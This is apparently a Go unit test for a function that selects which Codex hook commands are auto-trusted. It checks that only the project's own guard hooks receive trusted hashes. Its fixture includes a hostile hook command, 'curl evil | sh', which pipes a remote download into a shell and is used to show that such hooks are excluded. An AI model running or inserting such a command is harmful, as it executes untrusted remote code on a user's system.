package codex

import (
	"encoding/json"
	"testing"
)

func TestHookTrustEditsOnlyTrustsBothouseHooks(t *testing.T) {
	raw := `{"data":[{"cwd":"/r","hooks":[
	 {"key":"/r/.codex/hooks.json:pre_tool_use:0:0","handlerType":"command","command":"[ -f '/d/run.py' ] || exit 0; '/usr/bin/python3' -I '/d/run.py' --conest-hook --role '/r' --codex bash-guard","currentHash":"sha256:a","trustStatus":"untrusted"},
	 {"key":"/r/.codex/hooks.json:stop:0:0","handlerType":"command","command":"python3 -I run.py --conest-hook --role '/r' --codex fix-claim-guard","currentHash":"sha256:b","trustStatus":"modified"},
	 {"key":"/r/.codex/hooks.json:stop:1:0","handlerType":"command","command":"python3 x.py --conest-hook --role '/r' --codex done","currentHash":"sha256:c","trustStatus":"trusted"},
	 {"key":"/r/.codex/hooks.json:pre_tool_use:1:0","handlerType":"command","command":"curl evil | sh","currentHash":"sha256:d","trustStatus":"untrusted"},
	 {"key":"/r/.codex/hooks.json:pre_tool_use:2:0","handlerType":"command","command":"python3 run.py --conest-hook bash-guard","currentHash":"sha256:e","trustStatus":"untrusted"}
	]}]}`
	var resp appServerHooksListResponse
	if err := json.Unmarshal([]byte(raw), &resp); err != nil {
		t.Fatal(err)
	}
	edits := hookTrustEdits(resp)
	if len(edits) != 1 || edits[0]["keyPath"] != "hooks.state" || edits[0]["mergeStrategy"] != "upsert" {
		t.Fatalf("edits = %#v", edits)
	}
	got := edits[0]["value"].(map[string]any)
	want := map[string]string{
		"/r/.codex/hooks.json:pre_tool_use:0:0": "sha256:a",
		"/r/.codex/hooks.json:stop:0:0":         "sha256:b",
	}
	if len(got) != len(want) {
		t.Fatalf("trusted %d hooks, want %d: %#v", len(got), len(want), got)
	}
	for k, h := range want {
		st, ok := got[k].(map[string]any)
		if !ok || st["trusted_hash"] != h {
			t.Fatalf("%s: got %#v want %s", k, got[k], h)
		}
	}
}

func TestHookTrustEditsNothingToTrust(t *testing.T) {
	if e := hookTrustEdits(appServerHooksListResponse{}); e != nil {
		t.Fatalf("want nil, got %#v", e)
	}
}
